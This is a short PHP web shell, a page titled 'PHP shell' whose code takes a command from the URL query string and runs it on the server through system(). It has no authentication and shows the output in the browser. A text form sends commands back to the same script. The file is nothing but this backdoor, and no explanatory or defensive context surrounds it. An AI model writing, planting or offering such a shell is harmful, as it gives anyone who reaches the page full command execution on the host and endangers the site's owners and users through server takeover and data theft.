<html><head><title>PHP shell</title></head>

<body><pre>

<?php

$cmd = urldecode( substr( $_SERVER['QUERY_STRING'], 3));

if ($cmd != '') 
{
    echo "<b>$ $cmd</b><br><br>\n";
    if (!system( $cmd)) echo "<b>Impossible to execute</b>\n";
}

?>

</pre>

<form name="fsh" method="get" action="sh.php">
<input type="text" name="sh" size="80">
</form>

</body></html>

